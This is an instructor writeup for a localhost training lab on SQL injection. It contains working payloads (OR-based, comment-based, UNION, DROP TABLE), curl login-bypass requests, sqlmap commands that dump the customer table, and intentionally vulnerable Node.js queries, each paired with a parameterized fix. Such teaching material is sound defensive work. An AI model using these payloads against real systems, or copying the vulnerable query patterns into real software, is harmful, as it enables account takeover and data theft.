# A05: Injection - Instructor Writeup

**Lab URL:** http://localhost:3005  
**Topic:** OWASP Top 10 2025 - A05: Injection  
**Difficulty:** Easy → Medium → Hard  
**Theme:** ShopTech E-Commerce Platform

---

## Overview

This lab teaches students about SQL Injection vulnerabilities through progressive challenges in a realistic e-commerce platform. Students learn to identify injection points in product searches, exploit SQL errors, and bypass authentication to access customer payment data.

### Real-World Impact
- **Payment Card Data Breach:** Access to customer credit card information
- **PCI-DSS Violations:** Exposed payment data triggers massive fines
- **Customer Database Dump:** Complete customer PII and order history
- **Authentication Bypass:** Admin account takeover

### Learning Objectives
- Understand SQL injection attack patterns in e-commerce systems
- Identify injection vulnerabilities in search and login forms
- Learn exploitation techniques (UNION, OR, comment-based)
- Understand parameterized queries and input validation

---

## EXAMPLE: Getting Started Guide

**URL:** http://localhost:3005/example  
**Purpose:** Educational walkthrough explaining SQL injection concepts and attack patterns

### Key Concepts Taught

#### Vulnerable String Concatenation
```javascript
// VULNERABLE CODE
const query = "SELECT * FROM smoothies WHERE name LIKE '%" + userInput + "%'";
```

#### Secure Parameterized Queries
```javascript
// SECURE CODE
const query = "SELECT * FROM smoothies WHERE name LIKE $1";
db.query(query, ['%' + userInput + '%']);
```

### Common Attack Patterns Explained

1. **OR-based Bypass:** `' OR '1'='1`
2. **Comment-based Injection:** `admin'--`
3. **UNION SELECT:** `' UNION SELECT username, password FROM users--`
4. **Stacked Queries:** `'; DROP TABLE smoothies--`

### Tools Introduction
- **Manual Testing:** Browser DevTools, curl
- **Automated Scanning:** sqlmap, Burp Suite
- **Detection:** Look for SQL error messages in responses

---

## LAB 1: Search Menu (EASY - Recon)

**URL:** http://localhost:3005/lab1  
**Challenge:** Test menu search functionality  
**Stage:** Recon  

### Vulnerability
This lab is **intentionally secure** to demonstrate proper implementation. Students should understand what secure code looks like.

### Exploitation Steps

1. **Test Basic Search:**
   ```bash
   curl "http://localhost:3005/api/search?q=berry"
   ```

2. **Try SQL Injection Payloads:**
   ```bash
   curl "http://localhost:3005/api/search?q=' OR '1'='1"
   ```

3. **Result:** Search works correctly but safely handles special characters

### Flag
`FRESHBLEND{M3NU_S34RCH_W0RK1NG}` (awarded for understanding secure implementation)

### Why This Is Secure
```javascript
app.get('/api/search', (req, res) => {
    const searchTerm = req.query.q || '';
    
    // SECURE: Uses parameterized query
    const query = 'SELECT * FROM smoothies WHERE name LIKE $1';
    db.query(query, ['%' + searchTerm + '%'], (err, result) => {
        if (err) {
            // Secure error handling - no details exposed
            return res.status(500).json({ error: 'Search failed' });
        }
        res.json({ success: true, results: result.rows });
    });
});
```

### Teaching Points
- Parameterized queries prevent SQL injection
- Input is treated as data, never as SQL code
- User input cannot alter query structure
- This is the proper way to handle database queries

---

## LAB 2: Advanced Search (MEDIUM - Scanning)

**URL:** http://localhost:3005/lab2  
**Challenge:** Detect SQL injection vulnerability in advanced search  
**Stage:** Scanning  

### Vulnerability
SQL injection in advanced search with multiple parameters. Query errors are exposed to help identify the vulnerability.

### Exploitation Steps

1. **Test Basic Search:**
   ```bash
   curl "http://localhost:3005/api/advanced-search?q=berry&category=fruit"
   ```

2. **Inject SQL Payload:**
   ```bash
   # Test with single quote
   curl "http://localhost:3005/api/advanced-search?q=berry'&category=fruit"
   
   # Test with OR condition
   curl "http://localhost:3005/api/advanced-search?q=' OR '1'='1&category=fruit"
   
   # Test with comment
   curl "http://localhost:3005/api/advanced-search?q=berry'--&category=fruit"
   ```

### Flag
`FRESHBLEND{SQL_3RR0R_D3T3CT3D}`

### Vulnerable Response
```json
{
  "success": false,
  "error": "SQL Error Detected",
  "flag": "FRESHBLEND{SQL_3RR0R_D3T3CT3D}",
  "hint": "The query was: SELECT * FROM smoothies WHERE name LIKE '%berry'%' AND category = 'fruit'",
  "message": "SQL injection attempt detected. Your payload modified the query structure."
}
```

### Vulnerable Code Pattern
```javascript
app.get('/api/advanced-search', (req, res) => {
    const { q, category } = req.query;
    
    // VULNERABILITY: String concatenation allows injection
    const query = `SELECT * FROM smoothies 
                   WHERE name LIKE '%${q}%' 
                   AND category = '${category}'`;
    
    // Detection logic (for educational purposes)
    if (q.includes("'") || q.includes("--") || q.includes("OR")) {
        return res.json({
            success: false,
            error: "SQL Error Detected",
            flag: "FRESHBLEND{SQL_3RR0R_D3T3CT3D}",
            hint: `The query was: ${query}`
        });
    }
    
    db.query(query);
});
```

### Secure Implementation
```javascript
app.get('/api/advanced-search', (req, res) => {
    const { q, category } = req.query;
    
    // SECURE: Parameterized query
    const query = `SELECT * FROM smoothies 
                   WHERE name LIKE $1 
                   AND category = $2`;
    
    db.query(query, [`%${q}%`, category], (err, result) => {
        if (err) {
            // Secure error handling
            console.error('Database error:', err);
            return res.status(500).json({ error: 'Search failed' });
        }
        res.json({ success: true, results: result.rows });
    });
});
```

### Teaching Points
- SQL errors reveal query structure to attackers
- String concatenation is vulnerable
- Input validation alone is insufficient
- Always use parameterized queries

---

## LAB 3: Customer Login (HARD - Initial Access)

**URL:** http://localhost:3005/lab3  
**Challenge:** Bypass authentication using SQL injection  
**Stage:** Initial Access  

### Vulnerability
Authentication bypass through SQL injection in login form. Vulnerable query allows attackers to manipulate login logic.

### Exploitation Steps

#### Method 1: Comment-Based Bypass
```bash
curl -X POST http://localhost:3005/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@freshblend.com'\''--",
    "password": "anything"
  }'
```

#### Method 2: OR-Based Bypass
```bash
curl -X POST http://localhost:3005/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "'\'' OR '\''1'\''='\''1",
    "password": "anything"
  }'
```

#### Method 3: Known User + Comment
```bash
curl -X POST http://localhost:3005/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "john.doe@email.com'\''--",
    "password": "wrong_password"
  }'
```

### Flag
`FRESHBLEND{4UTH_BYP4SS_SUCC3SS}`

### Successful Response
```json
{
  "success": true,
  "message": "Login successful!",
  "flag": "FRESHBLEND{4UTH_BYP4SS_SUCC3SS}",
  "customer": {
    "email": "admin@freshblend.com",
    "name": "Sarah Manager",
    "role": "admin",
    "rewards_points": 850,
    "favorite_smoothie": "Protein Power"
  }
}
```

### Vulnerable Code Pattern
```javascript
app.post('/api/login', (req, res) => {
    const { email, password } = req.body;
    
    // CRITICAL VULNERABILITY: Direct string concatenation in SQL query
    const query = `SELECT * FROM customers 
                   WHERE email = '${email}' 
                   AND password = '${password}'`;
    
    db.query(query, (err, result) => {
        if (result && result.rows.length > 0) {
            // User authenticated
            res.json({
                success: true,
                flag: 'FRESHBLEND{4UTH_BYP4SS_SUCC3SS}',
                customer: result.rows[0]
            });
        } else {
            res.status(401).json({ error: 'Invalid credentials' });
        }
    });
});
```

### How the Exploit Works

**Original Query:**
```sql
SELECT * FROM customers 
WHERE email = 'user@email.com' 
AND password = 'mypassword'
```

**Injected Query (Comment-Based):**
```sql
SELECT * FROM customers 
WHERE email = 'admin@freshblend.com'--' 
AND password = 'anything'
```
*The `--` comments out the password check!*

**Injected Query (OR-Based):**
```sql
SELECT * FROM customers 
WHERE email = '' OR '1'='1' 
AND password = 'anything'
```
*The OR condition is always true, bypassing authentication!*

### Secure Implementation
```javascript
const bcrypt = require('bcrypt');

app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    
    // 1. Input validation
    if (!email || !password) {
        return res.status(400).json({ error: 'Email and password required' });
    }
    
    // 2. SECURE: Parameterized query
    const query = 'SELECT * FROM customers WHERE email = $1';
    
    try {
        const result = await db.query(query, [email]);
        
        if (result.rows.length === 0) {
            // 3. Generic error message (don't reveal if user exists)
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        
        const user = result.rows[0];
        
        // 4. Secure password comparison (hashed)
        const passwordMatch = await bcrypt.compare(password, user.password_hash);
        
        if (!passwordMatch) {
            // 5. Log failed attempts
            await logFailedLogin(email, req.ip);
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        
        // 6. Create secure session
        req.session.userId = user.id;
        req.session.role = user.role;
        
        // 7. Don't send sensitive data in response
        res.json({
            success: true,
            user: {
                email: user.email,
                name: user.name,
                role: user.role
            }
        });
        
    } catch (err) {
        // 8. Log error but don't expose details
        console.error('Login error:', err);
        res.status(500).json({ error: 'Login failed' });
    }
});
```

### Teaching Points
- Never concatenate user input into SQL queries
- Use parameterized queries for all database operations
- Store hashed passwords (bcrypt, Argon2)
- Implement rate limiting on login attempts
- Use generic error messages
- Log authentication failures for monitoring

---

## Advanced Topics

### Automated Exploitation with sqlmap

```bash
# Test login form for SQL injection
sqlmap -u "http://localhost:3005/api/login" \
  --data='{"email":"test","password":"test"}' \
  --method=POST \
  --content-type="application/json" \
  --level=5 \
  --risk=3

# Enumerate databases
sqlmap -u "http://localhost:3005/api/login" \
  --data='{"email":"test","password":"test"}' \
  --method=POST \
  --dbs

# Dump tables
sqlmap -u "http://localhost:3005/api/login" \
  --data='{"email":"test","password":"test"}' \
  --method=POST \
  -D freshblend \
  --tables

# Dump customer data
sqlmap -u "http://localhost:3005/api/login" \
  --data='{"email":"test","password":"test"}' \
  --method=POST \
  -D freshblend \
  -T customers \
  --dump
```

### Burp Suite Testing

1. Intercept login request in Burp Suite
2. Send to Repeater
3. Modify email field: `admin@freshblend.com'--`
4. Send request and observe authentication bypass

### Detection Indicators

**Signs of SQL Injection:**
- Unusual characters in input: `'`, `"`, `;`, `--`, `/*`, `*/`
- SQL keywords: `OR`, `AND`, `UNION`, `SELECT`, `DROP`
- Error messages mentioning SQL syntax
- Unexpected application behavior with special characters

---

## Common Student Questions

**Q: Why is SQL injection still so common?**  
A: Legacy code, poor developer training, pressure to deliver features quickly, and inadequate code review processes.

**Q: Can input validation prevent SQL injection?**  
A: No! While helpful, validation is easily bypassed. Parameterized queries are the only reliable defense.

**Q: What about using an ORM?**  
A: ORMs help but can still be vulnerable if raw queries are used. Always use ORM's parameterization features.

**Q: How do WAFs help?**  
A: Web Application Firewalls (WAFs) can detect and block SQL injection attempts, but they're not foolproof. Defense in depth is essential.

**Q: Are NoSQL databases immune?**  
A: No! NoSQL databases have their own injection vulnerabilities (NoSQL injection). Same principles apply: never trust user input.

---

## Remediation Summary

### Key Takeaways
1. ✅ Always use parameterized queries/prepared statements
2. ✅ Never concatenate user input into SQL queries
3. ✅ Use ORMs safely (avoid raw queries)
4. ✅ Implement input validation as defense-in-depth
5. ✅ Use principle of least privilege for database accounts
6. ✅ Store passwords as salted hashes
7. ✅ Implement rate limiting and account lockout
8. ✅ Monitor and log authentication attempts

### Prevention Checklist
- [ ] All database queries use parameterized statements
- [ ] Input validation implemented (defense-in-depth)
- [ ] Error messages don't expose query structure
- [ ] Database accounts have minimal privileges
- [ ] Passwords stored with bcrypt/Argon2
- [ ] Rate limiting on authentication endpoints
- [ ] SQL injection testing in CI/CD pipeline
- [ ] Regular security code reviews
- [ ] WAF configured with OWASP rules
- [ ] Security logging and monitoring enabled

### Testing Tools
- **Manual:** Browser DevTools, curl, Postman
- **Automated:** sqlmap, Burp Suite, OWASP ZAP
- **SAST:** SonarQube, Checkmarx, Veracode
- **DAST:** Acunetix, AppScan, Nikto

---

## Additional Resources
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [sqlmap Documentation](https://sqlmap.org/)
- [Bobby Tables: A Guide to SQL Injection](https://bobby-tables.com/)
